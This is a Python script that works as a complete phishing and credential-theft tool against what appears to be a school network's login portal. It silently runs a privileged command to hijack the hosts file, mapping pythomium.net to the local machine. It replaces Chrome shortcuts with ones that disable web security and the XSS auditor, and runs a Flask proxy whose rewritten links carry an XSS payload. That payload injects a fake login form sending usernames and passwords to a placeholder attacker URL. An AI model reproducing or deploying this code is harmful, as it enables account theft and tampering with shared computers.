#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os

from urllib.request import urlopen
from bs4 import BeautifulSoup

from subprocess import (
    call,
    check_output
) 

from flask import (
    Flask,
    request 
)

app = Flask(__name__)

@app.route('/bul/<school>.html')
def callPage(school):
    code = urlopen(f"http://81.28.97.146/bul/{school}.html").read()
    code = BeautifulSoup(code, "html.parser")
    for a in code.findAll('a'):
        href = a["href"]
        original = href
        if href[:15] == "https://bulrezo":
            evil_link = """/start/authentNew?lp=x265y110message<P>Connexion+avec+la+BD+établie+le+10-8-2019+à+18h01.</P>%0D%0A&login=<script>function send_info(form) {%0Aif (form.lp.value != '') {%0Aform.action='http://YOUR-URL.com'%3B%0Areturn true%3B%0A} else {alert('Le mot de passe est indispensable !')%3B%0Aform.lp.focus()%3B%0Areturn false%3B%0A}%0A}%0A</script></h3><style>h3, p{display: none}</style></div><div id='RightZone'><br><br><br><h3 style='display: inline'><img src='https://bulrezo17.pythomium.net/static/password64.gif' class='icon'>Une authentification est requise<br>pour accéder à ce site.</h3><form onsubmit='send_info(this)'><h4><br><br><br>Veuillez donc SVP fournir ci-dessous :<br><br>Votre identifiant : <input type='text' name='login' maxlength='15' size='8'><br><br>Votre mot de passe : <input type='password' name='lp' maxlength='15' size='14'><br><br><input type='submit' class='button' value=' OK '></h4></form></div><style>"""
            a["href"] = '/'.join(href.split('/')[:-1]) + evil_link 

    return f"{str(code)}<iframe src='{original}' style='width:0;height:0;border:0; border:none;'></iframe>"
    
@app.errorhandler(404)
def redirect_real(page):
    # 81.28.97.146
    if '/'.join(request.base_url.split('/')[3:]).split('.')[-1] == "gif":
        return urlopen(f"http://81.28.97.146/{'/'.join(request.base_url.split('/')[3:])}").read()
    return f"<iframe style='position:fixed; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999' src='http://81.28.97.146/{'/'.join(request.base_url.split('/')[3:])}'></iframe>"

def verify_payload() -> bool:
    with open(f"{os.environ['HOMEDRIVE']}\\Windows\\System32\\drivers\\etc\\hosts", 'r') as hosts: 
        for host in hosts.readlines():
            if host[0] != '#' and len(host) > 1 and host.split(' ')[1] == "pythomium.net":
                return True 
    return False

def run_as_admin(payload: str):
    payload = f"powershell.exe Start-Process cmd '{payload}' -Verb runas"
    call(payload.split(' '))

def create_chrome_shortcut(dest: str):
    with open("shortcut.vbs", 'w') as script:
        script.write(f"""Set objShell = WScript.CreateObject("WScript.Shell")
        Set lnk = objShell.CreateShortcut("{dest}")
   
        lnk.TargetPath = "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
        lnk.Arguments = "--args --disable-web-security --disable-xss-auditor"
        lnk.Description = "Acceder a Internet"
        lnk.IconLocation = "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe, 0"
        lnk.WindowStyle = "1"
        lnk.WorkingDirectory = "%ProgramFiles(x86)%\Google\Chrome\Application\chrome.exe"
        lnk.Save
        """)
    call(["wscript", f"{os.getcwd()}\\shortcut.vbs"])
    os.remove("shortcut.vbs")

def create_shortcut(path: str):
    os.remove(f"{os.environ['PUBLIC']}\\Desktop\\Google Chrome.lnk")
    os.remove(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\Google Chrome.lnk")

    if os.path.isfile(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk"):
        os.remove(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk")

    create_chrome_shortcut(f"{os.environ['HOMEDRIVE']}{os.environ['HOMEPATH']}\\Desktop\\Google Chrome.lnk")
    create_chrome_shortcut(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar\\Google Chrome.lnk")
    create_chrome_shortcut(f"{os.environ['APPDATA']}\\Microsoft\\Internet Explorer\\Quick Launch\\Google Chrome.lnk")

def change_chrome():
    path = f"{os.environ['ProgramFiles(x86)']}\\Google\\Chrome\\Application"
    if os.path.isdir(path):
        if os.path.isfile(f"{os.environ['PUBLIC']}\\Desktop\\Google Chrome.lnk"):
            create_shortcut(path)

if __name__ == "__main__":
    change_chrome()
    if not verify_payload():
        run_as_admin("/C echo 127.0.0.1 pythomium.net >>%HOMEDRIVE%\\Windows\\System32\\drivers\\etc\\hosts")
    
    app.run(debug=True, host="0.0.0.0", port=80)
